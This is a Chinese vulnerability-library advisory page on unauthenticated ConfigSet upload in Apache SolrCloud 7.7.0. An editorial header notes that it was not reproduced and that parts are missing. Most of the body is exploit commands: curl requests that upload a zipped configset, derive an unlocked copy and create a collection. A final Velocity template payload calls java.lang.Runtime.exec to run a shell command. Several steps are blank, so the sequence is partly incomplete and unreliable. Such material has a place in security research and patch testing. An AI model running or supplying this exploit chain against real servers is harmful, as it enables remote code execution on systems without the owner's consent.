---
source: "白阁文库 BaizeSec/bylibrary"
title: "Apache Solr未授权上传漏洞"
product: "Apache SolrCloud ConfigSets"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "SolrCloud，ConfigSet UPLOAD/CREATE与collection创建可达，恶意配置/Velocity模板能力可用"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-96eb3b3ec55f56955f082860"
entity_id: "ve-96eb3b3ec55f56955f082860"
schema_version: "1"
---

# Apache Solr未授权上传漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：SolrCloud，ConfigSet UPLOAD/CREATE与collection创建可达，恶意配置/Velocity模板能力可用
- 证据范围：包含上传再baseConfigSet复制步骤，区别于210的直接集合创建；恶意配置内容本身未保留。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 编译恶意配置后空白，没有需改文件内容，无法还原核心步骤
- 路径行没有cd，命令无代码围栏
- 最后curl双引号中的$x等会被shell提前展开，示例无法保留原模板
- 缺版本/修复/结果和配置持久变更警告；最后执行命令段空白

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

需要solr以cloud模式启动，特征是：


会有一个cloud的功能 。

编译一个恶意配置：


在对应目录下依次执行以下shell命令。

/solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf

zip -r - * > mytest.zip

curl -X POST --header "Content-Type:application/octet-stream" --data-binary @mytest.zip "http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=mytest"  #注册一个配置文件集合为mytest

curl "http://127.0.0.1:8983/api/cluster/configs?omitHeader=true"  #查询配置文件集合是否上传成功

curl "http://127.0.0.1:8983/solr/admin/configs?action=CREATE&name=mytest2&baseConfigSet=mytest&configSetProp.immutable=false&wt=xml&omitHeader=true"

curl "http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=mytest&numShards=1&replicationFactor=1&wt=xml&collection.configName=mytest2" #使用之前上传的配置文件集合为mytest


curl -v "http://127.0.0.1:8983/solr/mytest/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

最后执行命令：


---

> 来源：白阁文库 BaizeSec/bylibrary
